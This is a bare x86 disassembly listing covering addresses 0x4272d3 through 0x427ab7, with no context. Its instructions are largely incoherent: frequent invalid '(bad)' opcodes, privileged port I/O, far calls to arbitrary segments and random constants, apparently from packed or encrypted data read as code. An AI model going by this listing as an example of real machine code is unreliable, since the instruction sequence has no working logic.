  4272d3:	aad    0x62
  4272d5:	cmp    esi,ebx
  4272d7:	add    BYTE PTR [ebp+0x2f],bl
  4272da:	ja     0x4272b1
  4272dc:	lods   eax,DWORD PTR ds:[esi]
  4272dd:	scas   eax,DWORD PTR es:[edi]
  4272de:	jp     0x427298
  4272e0:	inc    ebx
  4272e1:	pushf  
  4272e2:	adc    al,0x18
  4272e4:	cwde   
  4272e5:	add    eax,0xa81e44e0
  4272ea:	stos   BYTE PTR es:[edi],al
  4272eb:	or     dl,BYTE PTR [ecx]
  4272ed:	in     eax,0xeb
  4272ef:	push   0xa81bb21f
  4272f4:	mov    al,0xb8
  4272f6:	dec    esp
  4272f7:	retf   
  4272f8:	fcmove st,st(7)
  4272fa:	das    
  4272fb:	pop    ds
  4272fc:	mov    eax,0x4c8b4fee
  427301:	inc    esp
  427302:	repnz fsubrp st(1),st
  427305:	hlt    
  427306:	pop    es
  427307:	xchg   DWORD PTR [ebx-0x6d2bc258],ebx
  42730d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42730e:	jo     0x42732a
  427310:	lds    eax,FWORD PTR [ebx+ecx*8-0x2d]
  427314:	xor    ebx,eax
  427316:	sbb    eax,0x55d5a577
  42731b:	mov    edx,0x8697035b
  427320:	pusha  
  427321:	(bad)  
  427323:	(bad)  
  427325:	jb     0x4272c7
  427327:	cs jl  0x427305
  42732a:	jbe    0x4273aa
  42732c:	lea    eax,[eax+0x35d9d844]
  427332:	and    ebx,edx
  427334:	loop   0x427376
  427336:	fldcw  WORD PTR [esi-0x5]
  427339:	pop    edi
  42733a:	cmp    eax,DWORD PTR [edi]
  42733c:	out    dx,eax
  42733d:	mov    eax,0x1fa14c1
  427342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427343:	xchg   ecx,eax
  427344:	xor    esi,DWORD PTR [bp+di]
  427347:	xchg   ebx,eax
  427348:	pop    ss
  427349:	call   0x6ddd3da1
  42734e:	loopne 0x42734e
  427350:	push   ss
  427351:	cmp    al,0x2b
  427353:	test   al,0xfc
  427355:	js     0x42737e
  427357:	push   ds
  427358:	mov    ebx,0x21d2df0
  42735d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42735e:	push   eax
  42735f:	jne    0x4273c9
  427361:	cmc    
  427362:	xor    eax,0xa1a38440
  427367:	repnz pop ss
  427369:	push   ebp
  42736a:	adc    eax,esp
  42736c:	mov    ds:0x9a3c8347,eax
  427371:	xchg   ecx,eax
  427372:	jnp    0x427302
  427374:	pop    edx
  427375:	mov    ch,0xd4
  427377:	push   ss
  427378:	inc    bl
  42737a:	add    ecx,ebp
  42737c:	xlat   BYTE PTR ds:[ebx]
  42737d:	shl    BYTE PTR [esi+ecx*4],cl
  427380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427381:	xchg   DWORD PTR [edx+0x1],ebp
  427384:	add    ecx,DWORD PTR [edx+edx*4]
  427387:	jb     0x4273ca
  427389:	das    
  42738a:	call   0xca19:0xa5f27423
  427391:	popf   
  427392:	fwait
  427393:	hlt    
  427394:	inc    esi
  427395:	pop    ds
  427396:	out    0x27,eax
  427398:	gs push ss
  42739a:	(bad)  
  42739b:	mov    esp,0x706c04c7
  4273a0:	xchg   ebp,eax
  4273a1:	bound  edi,QWORD PTR [eax-0x1a]
  4273a4:	push   ax
  4273a6:	adc    eax,DWORD PTR [eax-0x3a0565ee]
  4273ac:	jge    0x4273a0
  4273ae:	pop    ds
  4273af:	or     BYTE PTR ds:[ebp-0x1c974269],ch
  4273b6:	pop    ecx
  4273b7:	cdq    
  4273b8:	das    
  4273b9:	jo     0x427411
  4273bb:	dec    edi
  4273bc:	cmp    al,0x7b
  4273be:	ins    DWORD PTR es:[edi],dx
  4273bf:	inc    ebp
  4273c0:	stc    
  4273c1:	stc    
  4273c2:	test   edx,ebx
  4273c4:	(bad)  
  4273c5:	pop    edx
  4273c6:	or     DWORD PTR [ebx+0x7e],ebx
  4273c9:	push   ds
  4273ca:	stos   BYTE PTR es:[edi],al
  4273cb:	cmp    bl,dl
  4273cd:	(bad)  
  4273ce:	xor    BYTE PTR [ebp+0x3c],ah
  4273d1:	mov    eax,ds:0x1c47f32a
  4273d6:	and    DWORD PTR [esi-0xa6c79b],ecx
  4273dc:	ins    DWORD PTR es:[edi],dx
  4273dd:	stc    
  4273de:	or     al,0xa9
  4273e0:	xchg   edi,eax
  4273e1:	(bad)  
  4273e2:	pop    ebp
  4273e3:	inc    edx
  4273e4:	stc    
  4273e5:	stos   BYTE PTR es:[edi],al
  4273e6:	ficom  WORD PTR [edx+ebp*1+0x70]
  4273ea:	push   ebx
  4273eb:	sahf   
  4273ec:	dec    edx
  4273ed:	ins    DWORD PTR es:[edi],dx
  4273ee:	xor    ebx,DWORD PTR [eax]
  4273f0:	ret    0xa1d5
  4273f3:	mov    edx,0xc8adfd35
  4273f8:	pop    ds
  4273f9:	test   eax,0x3a324e0c
  4273fe:	mov    DWORD PTR [esi+0x5ab62e1c],esi
  427404:	sub    edi,DWORD PTR [ebp+0x65]
  427407:	jecxz  0x4273f2
  427409:	loope  0x427455
  42740b:	pushf  
  42740c:	xor    dh,BYTE PTR [edi-0x67]
  42740f:	loope  0x4273a4
  427411:	cs loope 0x427472
  427414:	repz jge 0x4273ef
  427417:	cmp    DWORD PTR [edi-0x1d0d4e99],eax
  42741d:	xor    DWORD PTR [ebx],esp
  42741f:	xchg   BYTE PTR [ebx-0x69],dl
  427422:	test   eax,0x3ca4036b
  427427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427428:	push   0xffffffb5
  42742a:	ss into 
  42742c:	mov    dl,0x26
  42742e:	mov    ecx,0xd08b95fc
  427433:	jne    0x42741b
  427435:	int3   
  427436:	ud0    edx,DWORD PTR fs:[edx]
  42743a:	popf   
  42743b:	adc    al,0xc0
  42743d:	xor    DWORD PTR [esi],edx
  42743f:	push   esi
  427440:	or     eax,ebx
  427442:	or     DWORD PTR ds:0x6fbd3894,esp
  427448:	outs   dx,BYTE PTR ds:[esi]
  427449:	xlat   BYTE PTR ds:[ebx]
  42744a:	mov    ebx,0x8b19a4e4
  42744f:	mov    WORD PTR [esi],ds
  427451:	outs   dx,DWORD PTR ds:[esi]
  427452:	cmp    BYTE PTR [ebp+0x4fb6b4f4],ah
  427458:	lds    esp,FWORD PTR [esi]
  42745a:	sub    DWORD PTR [eax-0x63],ecx
  42745d:	adc    eax,0x91df06e9
  427462:	pop    eax
  427463:	inc    esi
  427464:	dec    esi
  427465:	or     eax,0x74ab4c55
  42746a:	das    
  42746b:	push   edi
  42746c:	into   
  42746d:	jne    0x427497
  42746f:	stos   BYTE PTR es:[edi],al
  427470:	xor    BYTE PTR [ecx],ah
  427472:	jno    0x42743c
  427474:	das    
  427475:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427477:	sub    BYTE PTR [ebp+0x14272d76],0x39
  42747e:	data16 fwait
  427480:	lods   al,BYTE PTR ds:[esi]
  427481:	lods   al,BYTE PTR ds:[esi]
  427482:	into   
  427483:	popa   
  427484:	retf   0x1426
  427487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427488:	dec    eax
  427489:	add    eax,0x54ec7c60
  42748e:	and    al,0x74
  427490:	mov    edi,0x29ef566f
  427495:	inc    esp
  427496:	xchg   ebx,eax
  427497:	stos   BYTE PTR es:[edi],al
  427498:	sbb    eax,0xb044d3d6
  42749d:	ins    BYTE PTR es:[edi],dx
  42749e:	repz push cs
  4274a0:	fwait
  4274a1:	cli    
  4274a2:	lock jb 0x427435
  4274a5:	xchg   esi,eax
  4274a6:	mov    al,ds:0x590baf20
  4274ab:	test   BYTE PTR [edi-0x54],al
  4274ae:	out    0xe8,eax
  4274b0:	ja     0x42750d
  4274b2:	icebp  
  4274b3:	fld    QWORD PTR [esi-0xf]
  4274b6:	loope  0x4274d6
  4274b8:	sub    bh,BYTE PTR ds:0x23851888
  4274be:	add    ebp,DWORD PTR [edi+0x415ca41f]
  4274c4:	add    bh,cl
  4274c6:	push   di
  4274c8:	call   0x6cc3:0x1e212039
  4274cf:	fwait
  4274d0:	or     eax,0x921916db
  4274d5:	adc    al,0x18
  4274d7:	mov    ch,0xab
  4274d9:	adc    al,BYTE PTR [eax]
  4274db:	add    BYTE PTR [ecx+0x3],bl
  4274de:	rol    DWORD PTR [ebx+ebx*8-0x3a],0xdd
  4274e3:	pop    ds
  4274e4:	sub    ebp,DWORD PTR [esi+0x20f83eba]
  4274ea:	xor    eax,0x1ecc254
  4274ef:	add    BYTE PTR [esi+0x36000002],al
  4274f5:	imul   edx,DWORD PTR [edi+edi*8+0x5],0xba45d12d
  4274fd:	jl     0x427566
  4274ff:	cmp    cl,ch
  427501:	xchg   ecx,eax
  427502:	ror    BYTE PTR [ecx-0x622a1e05],0x11
  427509:	mov    BYTE PTR [esi],dl
  42750b:	pop    eax
  42750c:	mov    ebp,0xd98979ff
  427511:	jb     0x4274aa
  427513:	out    dx,al
  427514:	mov    es,WORD PTR [ecx-0x66537c6e]
  42751a:	adc    al,0x63
  42751c:	daa    
  42751d:	cmp    BYTE PTR [ebx-0x30bb6678],dh
  427523:	sar    DWORD PTR [edx-0x6e],cl
  427526:	sahf   
  427527:	dec    edi
  427528:	cmp    eax,0x60daf686
  42752d:	fst    DWORD PTR [ecx+0x53]
  427530:	call   0xa867:0x4f0b966
  427537:	retf   0xdf70
  42753a:	and    BYTE PTR ds:0x8beeb20c,bl
  427540:	inc    ebx
  427541:	xlat   BYTE PTR ds:[ebx]
  427542:	xchg   edi,eax
  427543:	(bad)  
  427544:	in     eax,0x7
  427546:	nop
  427547:	ins    BYTE PTR es:[edi],dx
  427548:	ficomp DWORD PTR [edx+0x49363df9]
  42754e:	sub    ebp,eax
  427550:	push   es
  427551:	dec    edi
  427552:	sub    al,BYTE PTR [ecx]
  427554:	xor    cl,BYTE PTR [ecx]
  427556:	xchg   BYTE PTR ds:0xd1147d31,bl
  42755c:	dec    esp
  42755d:	xchg   edx,eax
  42755e:	aad    0xf8
  427560:	xor    al,0x5f
  427562:	inc    edi
  427563:	lea    eax,[ebp+0x3b39ca15]
  427569:	adc    DWORD PTR [edi-0x529cc495],ebx
  42756f:	int3   
  427570:	leave  
  427571:	xchg   al,dl
  427573:	aas    
  427574:	out    dx,eax
  427575:	(bad)  
  427576:	enter  0x42b7,0xea
  42757a:	mov    ds:0xe0d75b20,al
  42757f:	sub    ch,BYTE PTR ds:0xba36051a
  427585:	repz jo 0x427541
  427588:	mov    dh,0x12
  42758a:	pop    ds
  42758b:	inc    ebp
  42758c:	xor    BYTE PTR [esi],bh
  42758e:	push   es
  42758f:	test   DWORD PTR [eax+0x64897cb2],ebp
  427595:	scas   eax,DWORD PTR es:[edi]
  427596:	inc    eax
  427597:	in     eax,0xca
  427599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42759a:	dec    edi
  42759b:	retf   0x14f
  42759e:	out    0x73,eax
  4275a0:	arpl   WORD PTR [edx],di
  4275a2:	sub    al,BYTE PTR [edx-0x67bbb54f]
  4275a8:	jbe    0x4275c6
  4275aa:	pop    esp
  4275ab:	push   ss
  4275ac:	sbb    DWORD PTR [ebp+0x3a808da4],esi
  4275b2:	cmp    al,0x7a
  4275b4:	mov    es,WORD PTR [edx+ecx*1-0x14]
  4275b8:	mov    cl,0x32
  4275ba:	add    BYTE PTR [esi],bl
  4275bc:	mov    ah,0x4
  4275be:	fisub  DWORD PTR [ecx]
  4275c0:	leave  
  4275c1:	mov    edx,0x802621b2
  4275c6:	xchg   DWORD PTR [edi],ebx
  4275c8:	mov    esp,0x8de02854
  4275cd:	sub    BYTE PTR [ecx-0x3c],bl
  4275d0:	and    eax,0x4308d4f7
  4275d5:	cs aaa 
  4275d7:	inc    esp
  4275d8:	loope  0x4275f1
  4275da:	imul   esp,DWORD PTR [ecx-0x2a],0xd35197f7
  4275e1:	and    DWORD PTR [esi-0x72],0x32915d45
  4275e8:	mov    eax,ds:0x7cd20e3f
  4275ed:	mov    eax,ds:0x3e184b2e
  4275f2:	ins    BYTE PTR es:[edi],dx
  4275f3:	fiadd  DWORD PTR [eax+0x74ea068a]
  4275f9:	js     0x4275fc
  4275fb:	fnstcw WORD PTR [ecx+0x6f75ba06]
  427601:	pop    edx
  427602:	loop   0x4275cf
  427604:	arpl   WORD PTR [eax-0x3d],bp
  427607:	jb     0x42760e
  427609:	adc    eax,0xa9dfa1ec
  42760e:	pop    esp
  42760f:	xor    al,0xa5
  427611:	loope  0x427620
  427613:	outs   dx,BYTE PTR ds:[esi]
  427614:	dec    eax
  427615:	into   
  427616:	add    al,0x99
  427618:	mov    eax,ss:0xabafb205
  42761e:	fidiv  DWORD PTR [edx+0x622d0359]
  427624:	out    dx,eax
  427625:	addr16 mov esi,0x144a8cf7
  42762b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42762c:	mov    ss,WORD PTR [ecx]
  42762e:	ret    0x4575
  427631:	ror    DWORD PTR [esi+0x1ae4a943],cl
  427637:	popf   
  427638:	hlt    
  427639:	or     esp,DWORD PTR [edi]
  42763b:	push   edi
  42763c:	xchg   ebx,eax
  42763d:	imul   esp,DWORD PTR fs:[ebp-0x4524a95d],0xe1d25c65
  427648:	push   edx
  427649:	or     DWORD PTR gs:[ecx+esi*8-0x3557c0e],esi
  427651:	idiv   BYTE PTR [ecx]
  427653:	test   BYTE PTR [edx],bh
  427655:	idiv   edx
  427657:	iret   
  427658:	dec    edx
  427659:	lahf   
  42765a:	int3   
  42765b:	(bad)  
  42765c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42765d:	out    0x4f,al
  42765f:	xchg   BYTE PTR [eax+ebx*8+0xda98247],al
  427666:	push   0x7f2b3a8
  42766b:	imul   ecx,DWORD PTR ds:0xde6e8950,0xffffffe4
  427672:	add    eax,0x3665e402
  427677:	hlt    
  427678:	jo     0x427672
  42767a:	and    DWORD PTR [ebx+0x6f],edx
  42767d:	cs inc esi
  42767f:	clc    
  427680:	das    
  427681:	daa    
  427682:	push   cs
  427683:	mov    ebp,0x5a031edc
  427688:	call   DWORD PTR [ecx-0x92fc1a2]
  42768e:	lods   al,BYTE PTR ds:[esi]
  42768f:	xchg   edx,eax
  427690:	mov    esp,0xab448c5b
  427695:	add    eax,0xbd0cf02e
  42769a:	call   0x22ae:0x7bccc365
  4276a1:	sub    DWORD PTR [ebp+0x4ee8bb27],edx
  4276a7:	and    BYTE PTR [ecx-0x3cb5f131],dl
  4276ad:	dec    ecx
  4276ae:	jae    0x4276cc
  4276b0:	jmp    0x42766b
  4276b2:	add    ah,BYTE PTR [ecx+0x3a0326b3]
  4276b8:	test   BYTE PTR [edx-0x7f6734c6],0xcf
  4276bf:	mov    ds:0xc402ea0b,al
  4276c4:	cmp    BYTE PTR ds:0xb8011354,al
  4276ca:	sbb    eax,0x4a999f78
  4276cf:	mov    eax,ds:0x3a8e3238
  4276d4:	cdq    
  4276d5:	xchg   edi,eax
  4276d6:	mov    dh,0x30
  4276d8:	pop    es
  4276d9:	mov    ?,ebx
  4276db:	scas   eax,DWORD PTR es:[edi]
  4276dc:	lods   eax,DWORD PTR ds:[esi]
  4276dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276de:	mov    al,0x46
  4276e0:	mov    edx,DWORD PTR [esi]
  4276e2:	out    dx,eax
  4276e3:	call   0xfa46:0x1d0ec364
  4276ea:	ds ss out dx,al
  4276ed:	xchg   edx,eax
  4276ee:	sbb    al,0xff
  4276f0:	or     BYTE PTR [ebx-0x4],cl
  4276f3:	stos   DWORD PTR es:[edi],eax
  4276f4:	pop    ebp
  4276f5:	mov    esi,0xaf2b89bd
  4276fa:	push   0x9014cc93
  4276ff:	cmp    BYTE PTR [ecx-0x1f],0xf0
  427703:	lahf   
  427704:	pop    ebx
  427705:	out    dx,al
  427706:	inc    esp
  427707:	cmp    BYTE PTR [ecx-0x73f72348],ch
  42770d:	xor    ebp,DWORD PTR [eax]
  42770f:	(bad)  
  427710:	jae    0x42775b
  427712:	pop    ecx
  427713:	add    al,0x2e
  427715:	xlat   BYTE PTR ds:[ebx]
  427716:	(bad)  [edi-0x19]
  427719:	lods   eax,DWORD PTR ds:[esi]
  42771a:	cmp    eax,0x5fd0be81
  42771f:	jl     0x427714
  427721:	add    BYTE PTR [ebx+0x19],0xa0
  427725:	adc    al,0x5c
  427727:	inc    edi
  427728:	jp     0x427792
  42772a:	sahf   
  42772b:	jge    0x4276dd
  42772d:	dec    esp
  42772e:	mov    bl,0xf6
  427730:	jge    0x427706
  427732:	mov    al,0x6
  427734:	or     ebx,DWORD PTR [esp+eiz*4-0x65e8a06d]
  42773b:	pop    ecx
  42773c:	int3   
  42773d:	and    al,0x4e
  42773f:	in     al,dx
  427740:	stos   BYTE PTR es:[edi],al
  427741:	and    al,0x1d
  427743:	push   0xffffffd0
  427745:	jge    0x42776b
  427747:	mov    bh,0xa4
  427749:	fild   WORD PTR [esi]
  42774b:	(bad)  
  42774c:	cmp    al,0x47
  42774e:	mov    ds:0xb497d90a,eax
  427753:	cmp    cl,BYTE PTR [ebx+0x58]
  427756:	xchg   ebx,eax
  427757:	mov    ecx,0xc85c176e
  42775c:	pop    edi
  42775d:	mov    esp,0xe7eb0b84
  427762:	jae    0x42774b
  427764:	xchg   esp,eax
  427765:	xlat   BYTE PTR ds:[bx]
  427767:	sar    ecx,1
  427769:	xchg   edx,eax
  42776a:	pusha  
  42776b:	and    edx,DWORD PTR [ebx]
  42776d:	test   al,0xa8
  42776f:	hlt    
  427770:	add    DWORD PTR [ebx-0x2fb4a585],edi
  427776:	inc    ebx
  427777:	inc    esp
  427778:	cli    
  427779:	popa   
  42777a:	add    BYTE PTR [eax],al
  42777c:	sbb    esp,DWORD PTR [edi]
  42777e:	pushf  
  42777f:	cli    
  427780:	mov    esp,0x2ae77ffb
  427785:	scas   al,BYTE PTR es:[edi]
  427786:	aad    0xf
  427788:	retf   0x973d
  42778b:	jp     0x4277d5
  42778d:	out    dx,eax
  42778e:	add    DWORD PTR [eax],eax
  427790:	xchg   BYTE PTR [edx],al
  427792:	add    BYTE PTR [eax],al
  427794:	xchg   esp,eax
  427795:	iret   
  427796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427797:	sbb    bl,0x73
  42779a:	jmp    0x48d0:0xde862dfa
  4277a1:	(bad)  
  4277a2:	pop    eax
  4277a3:	cs mov dl,0x66
  4277a6:	and    al,0x88
  4277a8:	push   esp
  4277a9:	lods   al,BYTE PTR ds:[esi]
  4277aa:	pop    edi
  4277ab:	mov    dh,0x8c
  4277ad:	scas   al,BYTE PTR es:[edi]
  4277ae:	movq   QWORD PTR [edx],mm4
  4277b1:	sbb    ecx,DWORD PTR [eax+0x22926a75]
  4277b7:	addr16 loopne 0x4277a0
  4277ba:	test   eax,0xf86f95ca
  4277bf:	lods   eax,DWORD PTR ds:[esi]
  4277c0:	add    eax,0xb1fd5643
  4277c5:	addr16 add esi,0x21f50792
  4277cc:	sbb    DWORD PTR [esi+ebp*1+0x5c676d79],esp
  4277d3:	push   0x54
  4277d5:	div    edx
  4277d7:	inc    ecx
  4277d8:	cli    
  4277d9:	mov    ebx,0xd00011c2
  4277de:	mov    dh,ah
  4277e0:	loope  0x42781f
  4277e2:	ja     0x427807
  4277e4:	sub    ebx,ebp
  4277e6:	aad    0x3
  4277e8:	mov    DWORD PTR [edx],esp
  4277ea:	mov    al,0x54
  4277ec:	dec    ecx
  4277ed:	xchg   esi,eax
  4277ee:	inc    esp
  4277ef:	mov    eax,0xc0641648
  4277f4:	inc    eax
  4277f5:	out    0xe4,eax
  4277f7:	test   al,0x7f
  4277f9:	sbb    BYTE PTR [edx],cl
  4277fb:	je     0x42777f
  4277fd:	or     eax,0xc0f68675
  427802:	mov    bh,0x25
  427804:	mov    bl,0xc4
  427806:	push   ds
  427807:	scas   al,BYTE PTR es:[edi]
  427808:	scas   eax,DWORD PTR es:[edi]
  427809:	xchg   esp,eax
  42780a:	fnsave [ecx+eiz*8-0xdf339e0]
  427811:	pop    ss
  427812:	mov    DWORD PTR [esi],esi
  427814:	add    DWORD PTR [ecx],edx
  427816:	call   0xc257:0x4bab3b40
  42781d:	cdq    
  42781e:	xor    dl,BYTE PTR [ebx+0x3892d4e7]
  427824:	sub    esp,DWORD PTR ds:0xcf836bce
  42782a:	sbb    eax,0xa52b6124
  42782f:	mov    al,ds:0xc171dc37
  427834:	cmp    al,0x3d
  427836:	sahf   
  427837:	jmp    0x427819
  427839:	hlt    
  42783a:	ficom  WORD PTR ds:0x93aa0eed
  427840:	fcomp  QWORD PTR [esi+0x24ce713c]
  427846:	mov    DWORD PTR [eax+0x41cd1bc2],edx
  42784c:	test   DWORD PTR [esi*1+0x616ef380],0xd0b3ddea
  427857:	hlt    
  427858:	and    DWORD PTR [ebp+0x78],edx
  42785b:	rcl    BYTE PTR [eax],cl
  42785d:	pop    esp
  42785e:	bound  edi,QWORD PTR [ebp-0x1b1eff8e]
  427864:	dec    ecx
  427865:	and    ebp,DWORD PTR [ecx+0x5c]
  427868:	data16 ds mov dl,0x78
  42786c:	in     al,0x8
  42786e:	inc    esp
  42786f:	shr    DWORD PTR [edi+0x23],1
  427872:	push   ss
  427873:	ret    
  427874:	inc    esp
  427875:	jp     0x4278ee
  427877:	andnps xmm4,XMMWORD PTR [ecx-0x5f190f49]
  42787e:	xchg   ebp,eax
  42787f:	fdiv   st(3),st
  427881:	ja     0x427818
  427883:	mov    cs,WORD PTR [ebx+ebp*2]
  427886:	rol    DWORD PTR [edi],cl
  427888:	mov    eax,ds:0xaac6235
  42788d:	in     eax,dx
  42788e:	lock outs dx,DWORD PTR ds:[esi]
  427890:	pop    esi
  427891:	mov    ecx,0x9c25640c
  427896:	cmp    ch,BYTE PTR [ebx+0x6f]
  427899:	les    esi,FWORD PTR [ebx]
  42789b:	shr    BYTE PTR [esi-0x6ef03aa2],0xeb
  4278a2:	push   ecx
  4278a3:	(bad)  
  4278a4:	dec    ebx
  4278a5:	ds loop 0x4278ca
  4278a8:	adc    edx,DWORD PTR [ebx]
  4278aa:	fist   WORD PTR [ebx-0x5abfa8cd]
  4278b0:	lds    ebp,FWORD PTR ds:0xdbe25600
  4278b6:	xchg   BYTE PTR [edx],dl
  4278b8:	push   ds
  4278b9:	xchg   esi,eax
  4278ba:	out    dx,eax
  4278bb:	push   DWORD PTR [ebp-0x3149cd2]
  4278c1:	call   0x226c7cc6
  4278c6:	jecxz  0x427866
  4278c8:	sbb    edi,DWORD PTR [ebx+eiz*1-0x5f]
  4278cc:	mov    edi,0x2f7b42b1
  4278d1:	mov    dl,0x25
  4278d3:	mov    edi,0x5e8d6f7f
  4278d8:	retf   0x2c7
  4278db:	or     eax,0x84dead14
  4278e0:	xchg   ebx,eax
  4278e1:	pop    ss
  4278e2:	mov    ah,0xf8
  4278e4:	jl     0x4278f6
  4278e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278e7:	es pop ds
  4278e9:	and    eax,0x9f25c34c
  4278ee:	pop    ebx
  4278ef:	add    DWORD PTR [ebp+0x67fc96f],eax
  4278f5:	jnp    0x42787e
  4278f7:	xchg   BYTE PTR [ebp+0x280c0170],dh
  4278fd:	sub    al,ah
  4278ff:	popa   
  427900:	out    0x81,eax
  427902:	outs   dx,BYTE PTR ds:[esi]
  427903:	mov    ecx,0xa7008571
  427908:	loop   0x4278e4
  42790a:	mov    WORD PTR [ebp-0x7c],es
  42790d:	ins    BYTE PTR es:[edi],dx
  42790e:	mov    bh,0xaa
  427910:	jle    0x4278bf
  427912:	sar    BYTE PTR [esi+0x727d38f],1
  427918:	xchg   ecx,eax
  427919:	mov    WORD PTR [ecx+0x1f],ds
  42791c:	push   eax
  42791d:	xor    dl,dh
  42791f:	inc    esi
  427920:	jg     0x42797d
  427922:	aam    0xb9
  427924:	adc    BYTE PTR [edi-0x2c],dl
  427927:	add    BYTE PTR [edi-0x4c],0x1e
  42792b:	jo     0x42797e
  42792d:	aaa    
  42792e:	or     ah,BYTE PTR [ebx+eax*8-0x16]
  427932:	or     al,BYTE PTR [ebx-0x49]
  427935:	sbb    DWORD PTR [edx-0x33],ecx
  427938:	dec    eax
  427939:	in     al,dx
  42793a:	adc    ebp,DWORD PTR [ebx]
  42793c:	fcomi  st,st(2)
  42793e:	lods   al,BYTE PTR ds:[esi]
  42793f:	lods   al,BYTE PTR ds:[esi]
  427940:	enter  0x903d,0x42
  427944:	push   0x87619fc9
  427949:	and    al,0xd
  42794b:	arpl   WORD PTR [eax+0x18],sp
  42794e:	popf   
  42794f:	inc    esi
  427950:	fcom   QWORD PTR [esi]
  427952:	xor    DWORD PTR [ebp-0x22],ecx
  427955:	out    dx,al
  427956:	xchg   ebp,eax
  427957:	cs inc esi
  427959:	dec    edi
  42795a:	cdq    
  42795b:	xchg   esp,eax
  42795c:	out    0x95,al
  42795e:	test   DWORD PTR [edi-0x2],0x311685d0
  427965:	(bad)  
  427966:	mov    ebp,0xf501d9a7
  42796b:	daa    
  42796c:	and    dh,bh
  42796e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42796f:	xor    eax,0x2d65dbba
  427974:	mov    ah,0xdf
  427976:	call   FWORD PTR [esi+ecx*1+0x1869d79f]
  42797d:	imul   edi,ebx,0x33
  427980:	jns    0x42798a
  427982:	shr    ebx,cl
  427984:	dec    eax
  427985:	rcl    BYTE PTR [edx+esi*8-0x31031308],1
  42798c:	push   edx
  42798d:	xor    DWORD PTR [ebp-0x48d8873c],ebx
  427993:	aas    
  427994:	pop    ebp
  427995:	je     0x427923
  427997:	inc    edi
  427998:	dec    eax
  427999:	mov    edi,0x58451a5e
  42799e:	lods   al,BYTE PTR ds:[esi]
  42799f:	pop    es
  4279a0:	std    
  4279a1:	inc    ebp
  4279a2:	mov    dl,0xcc
  4279a4:	std    
  4279a5:	aas    
  4279a6:	mov    ebx,0x7db9a578
  4279ab:	outs   dx,DWORD PTR ds:[esi]
  4279ac:	add    al,0xa7
  4279ae:	retf   0x355
  4279b1:	add    al,0x39
  4279b3:	enter  0xb57c,0x68
  4279b7:	or     al,bl
  4279b9:	inc    edx
  4279ba:	inc    cx
  4279bc:	xchg   BYTE PTR [edi+0x1bb2ac1b],dh
  4279c2:	mov    BYTE PTR [esi-0x2831c7a6],bl
  4279c8:	mov    dh,0x6b
  4279ca:	jnp    0x427986
  4279cc:	push   ecx
  4279cd:	cwde   
  4279ce:	dec    esi
  4279cf:	cwde   
  4279d0:	loope  0x4279b1
  4279d2:	in     eax,0xe8
  4279d4:	scas   eax,DWORD PTR es:[edi]
  4279d5:	call   DWORD PTR [edx-0x10363179]
  4279db:	(bad)  [ebx-0x2f]
  4279de:	jle    0x427a34
  4279e0:	sub    ebp,esp
  4279e2:	test   ecx,0x640793a9
  4279e8:	in     eax,dx
  4279e9:	jb     0x427a0a
  4279eb:	cwde   
  4279ec:	(bad)  
  4279ed:	jle    0x427a33
  4279ef:	pop    edx
  4279f0:	inc    ecx
  4279f1:	cmp    al,0x26
  4279f3:	mov    bh,0x89
  4279f5:	lock enter 0x526a,0xfe
  4279fa:	or     ch,cl
  4279fc:	in     eax,dx
  4279fd:	js     0x4279a7
  4279ff:	cmp    eax,0xd0e2eba1
  427a05:	scas   al,BYTE PTR es:[edi]
  427a06:	outs   dx,BYTE PTR ds:[esi]
  427a07:	cmp    DWORD PTR [edx+0x6fb8cf47],esp
  427a0d:	sub    ebp,DWORD PTR [ecx-0x24]
  427a10:	pop    edx
  427a11:	push   esp
  427a12:	fmul   DWORD PTR [ecx-0x2c6667e7]
  427a18:	add    bl,ch
  427a1a:	add    BYTE PTR [eax],al
  427a1c:	call   0xdafe:0xfef82244
  427a23:	bound  di,DWORD PTR [eax+0x46d07475]
  427a2a:	dec    esi
  427a2b:	mov    cl,0xce
  427a2d:	icebp  
  427a2e:	add    DWORD PTR [eax],eax
  427a30:	xchg   BYTE PTR [edx],al
  427a32:	add    BYTE PTR [eax],al
  427a34:	fcmove st,st(3)
  427a36:	jno    0x4279d6
  427a38:	xor    DWORD PTR [edi+0x4d3a97cf],0x35
  427a3f:	les    ebx,FWORD PTR [ecx+0x19]
  427a42:	or     eax,0xe2375c95
  427a47:	mov    al,ds:0x2503f70b
  427a4c:	xor    al,0xf2
  427a4e:	xor    DWORD PTR [edx+esi*2-0x2f20eb44],edx
  427a55:	dec    eax
  427a56:	xchg   esp,eax
  427a57:	xor    DWORD PTR [ebp+0x4],edi
  427a5a:	addr16 inc ecx
  427a5c:	dec    edi
  427a5d:	mov    ebp,0x3864a034
  427a62:	call   0xb917:0x1ec4a0e4
  427a69:	test   edx,0x96cee967
  427a6f:	jg     0x427a84
  427a71:	jmp    0x9a5b:0xe5c731b4
  427a78:	mov    bl,0xbc
  427a7a:	jae    0x427ae7
  427a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a7d:	enter  0x3096,0xb
  427a81:	jle    0x427ad2
  427a83:	lock imul ebp,edx,0xffffff9f
  427a87:	jecxz  0x427ae0
  427a89:	cmp    edx,DWORD PTR [eax+0xd]
  427a8c:	(bad)
  427a8f:	cmp    DWORD PTR [eax+0x1172e9bb],ecx
  427a95:	mov    ss:0x1c356b3a,al
  427a9b:	mov    eax,0x15416884
  427aa0:	jae    0x427a72
  427aa2:	(bad)  
  427aa4:	stc    
  427aa5:	cmp    DWORD PTR [esp+ecx*2-0xd84195f],ebp
  427aac:	sub    cl,BYTE PTR [edx]
  427aae:	frstor [eax-0x58c60a79]
  427ab4:	ja     0x427b06
  427ab6:	push   esi
  427ab7:	jg     0x427a4d
